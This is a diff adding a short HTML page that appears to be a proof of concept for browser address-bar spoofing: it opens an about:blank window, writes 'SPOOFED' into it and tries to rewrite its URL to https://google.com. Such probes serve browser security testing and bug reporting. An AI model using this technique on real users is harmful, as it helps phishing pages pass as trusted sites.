@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>about:blank</h2>
+<button onclick="run()">Run</button>
+
+<script>
+function run() {
+  const w = window.open("about:blank");
+
+  setTimeout(() => {
+    w.document.write("<h1>SPOOFED</h1>");
+    try {
+      w.history.replaceState({}, "", "https://google.com");
+    } catch(e){}
+  }, 200);
+}
+</script>
+
+</body>
+</html>
